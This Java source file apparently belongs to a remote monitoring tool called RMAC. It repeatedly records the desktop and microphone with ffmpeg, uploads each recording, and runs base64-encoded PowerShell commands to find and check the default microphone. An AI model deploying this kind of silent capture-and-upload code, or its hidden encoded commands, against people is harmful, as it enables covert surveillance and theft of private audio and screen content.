package com.rmac.core;

import com.rmac.Main;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.NoopOutputStream;
import com.rmac.utils.PipeStream;
import com.rmac.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Map;
import lombok.extern.slf4j.Slf4j;

/**
 * Records screen/audio for duration specified by <i>VideoDuration</i> config property.
 */
@Slf4j
public class ScreenRecorder implements Runnable {

  public Thread thread;
  /**
   * Reference to current ffmpeg screen recording process
   */
  public static Process currFFMPEGProc;

  public ScreenRecorder() {
    thread = new Thread(this, "ScreenRecorder");
    thread.start();
  }

  @Override
  public void run() {
    try {
      while (!Thread.interrupted()) {
        // If screen recording is disabled via config, keep idle.
        if (!Main.config.getScreenRecording()) {
          Thread.sleep(2000);
          continue;
        }

        // Start ffmpeg recording process in the background for the duration specified
        String fileName = Utils.getTimestamp();
        ProcessBuilder ffmpegBuilder = this.getFFMPEGProcessBuilder(fileName);
        Process ffmpegProc = ffmpegBuilder.start();
        currFFMPEGProc = ffmpegProc;

        // Wait for the recording to finish
        ffmpegProc.waitFor();
        currFFMPEGProc = null;

        // Upload the file
        Main.uploader.uploadFile(
            new File(Constants.CURRENT_LOCATION + "\\" + fileName + ".mkv"),
            ArchiveFileType.SCREEN);
      }
    } catch (InterruptedException | IOException e) {
      log.error("Could not record video", e);
    }
  }

  /**
   * Kill current ffmpeg recording process and stop.
   */
  public void shutdown() {
    if (currFFMPEGProc != null) {
      currFFMPEGProc.destroy();
    }
    try {
      Runtime.getRuntime().exec("taskkill /f /im ffmpeg.exe").waitFor();
    } catch (IOException | InterruptedException e) {
      log.error("Could not force stop ffmpeg", e);
    }
  }

  /**
   * Build and return the ffmpeg screen recording [and audio recording] process.
   *
   * @param fileName Screen recording output file name
   * @return ProcessBuilder for screen recording process
   * @throws IOException          when process building fails or RMAC fails to read process output.
   * @throws InterruptedException when this thread is interrupted while waiting for process to *
   *                              complete
   */
  private ProcessBuilder getFFMPEGProcessBuilder(String fileName)
      throws IOException, InterruptedException {
    ProcessBuilder ffmpegBuilder;

    String defaultMicName = this.getDefaultMicName();
    log.info("Mic Name: " + defaultMicName);
    log.info("Mic Active: " + isMicActive(defaultMicName));
    if (Main.config.getAudioRecording()
        && (Main.config.getActiveAudioRecording() || isMicActive(defaultMicName))
    ) {
      ffmpegBuilder = new ProcessBuilder("\""
          + Constants.FFMPEG_LOCATION
          + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
          + Main.config.getFPS()
          + " -threads 1 -i desktop -f dshow -i audio=\"" + defaultMicName
          + "\" -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
          + Main.config.getVideoDurationFormatted() + " -y \""
          + Constants.CURRENT_LOCATION + "\\"
          + fileName + ".mkv\"");
      ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    } else {
      ffmpegBuilder = new ProcessBuilder("\""
          + Constants.FFMPEG_LOCATION
          + "\" -hwaccel dxva2 -loglevel 0 -f gdigrab -framerate "
          + Main.config.getFPS()
          + " -threads 1 -i desktop -c:v h264 -preset:v fast -vf scale=1366:-1 -t "
          + Main.config.getVideoDurationFormatted() + " -y \""
          + Constants.CURRENT_LOCATION + "\\"
          + fileName + ".mkv\"");
      ffmpegBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    }

    return ffmpegBuilder;
  }

  /**
   * Fetch system's default microphone name
   * <br>
   * <br>
   * <cite>
   * Uses svcl.exe runtime.
   * </cite>
   *
   * @return The System's default microphone friendly name.
   * @throws IOException          when process building fails or RMAC fails to read process output.
   * @throws InterruptedException when this thread is interrupted while waiting for process to
   *                              complete
   */
  private String getDefaultMicName() throws IOException, InterruptedException {
    ProcessBuilder svclBuilder = new ProcessBuilder("powershell.exe", "-enc",
        "\"KAAoAC4AXABzAHYAYwBsAC4AZQB4AGUAIAAvAHMAYwBvAG0AbQBhACAAIgAiACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEMAcwB2ACkAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAEQAZQBmAGEAdQBsAHQAIAAtAGUAcQAgACIAQwBhAHAAdAB1AHIAZQAiACAALQBhAG4AZAAgACQAXwAuACIARABlAGYAYQB1AGwAdAAgAE0AdQBsAHQAaQBtAGUAZABpAGEAIgAgAC0AZQBxACAAIgBDAGEAcAB0AHUAcgBlACIAfQApAC4ATgBhAG0AZQAgACsAIAAiACAAKAAiACAAKwAgACgAKAAuAFwAcwB2AGMAbAAuAGUAeABlACAALwBzAGMAbwBtAG0AYQAgACIAIgAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBDAHMAdgApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBEAGUAZgBhAHUAbAB0ACAALQBlAHEAIAAiAEMAYQBwAHQAdQByAGUAIgAgAC0AYQBuAGQAIAAkAF8ALgAiAEQAZQBmAGEAdQBsAHQAIABNAHUAbAB0AGkAbQBlAGQAaQBhACIAIAAtAGUAcQAgACIAQwBhAHAAdAB1AHIAZQAiAH0AKQAuACIARABlAHYAaQBjAGUAIABOAGEAbQBlACIAIAArACAAIgApACIAIAB8ACAAZQBjAGgAbwA=\"");
    svclBuilder.directory(new File(Constants.RUNTIME_LOCATION));
    Process proc = svclBuilder.start();
    BufferedReader out = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    BufferedWriter in = new BufferedWriter(new OutputStreamWriter(proc.getOutputStream()));
    PipeStream err = new PipeStream(proc.getErrorStream(), new NoopOutputStream());
    err.start();
    StringBuilder result = new StringBuilder();
    String curr;
    while ((curr = out.readLine()) != null) {
      result.append(curr.trim());
    }
    proc.waitFor();
    in.close();
    out.close();

    return result.toString();
  }

  private boolean isMicActive(String micName) throws IOException, InterruptedException {
    ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-enc",
        "\"IAAkAHMAbwB1AHIAYwBlACAAPQAgACAAQAAiAA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AA0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAYwBsAGEAcwBzACAATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwANAAoAewANAAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACQAZQBuAHYAOgBSAE0AQQBDAF8ARABMAEwAXwBMAE8AQwBBAFQASQBPAE4ALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABpAHMATQBpAGMAQQBjAHQAaQB2AGUAKABzAHQAcgBpAG4AZwAgAG0AaQBjAE4AYQBtAGUAKQA7AA0ACgB9AA0ACgAiAEAADQAKACAAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlADsADQAKAFsATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBpAHMATQBpAGMAQQBjAHQAaQB2AGUAKAAkAGUAbgB2ADoAUgBNAEEAQwBfAEQARQBGAEEAVQBMAFQAXwBNAEkAQwApADsA\"");
    builder.directory(new File(Constants.RUNTIME_LOCATION));
    Map<String, String> env = builder.environment();
    env.put("RMAC_DLL_LOCATION", Constants.RMAC_DLL_LOCATION);
    env.put("RMAC_DEFAULT_MIC", micName);
    Process proc = builder.start();
    BufferedReader out = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    PipeStream err = new PipeStream(proc.getErrorStream(), new NoopOutputStream());
    err.start();
    StringBuilder result = new StringBuilder();
    String curr;
    while ((curr = out.readLine()) != null) {
      result.append(curr.trim());
    }
    proc.waitFor();
    out.close();

    return result.toString().equals("True");
  }
}
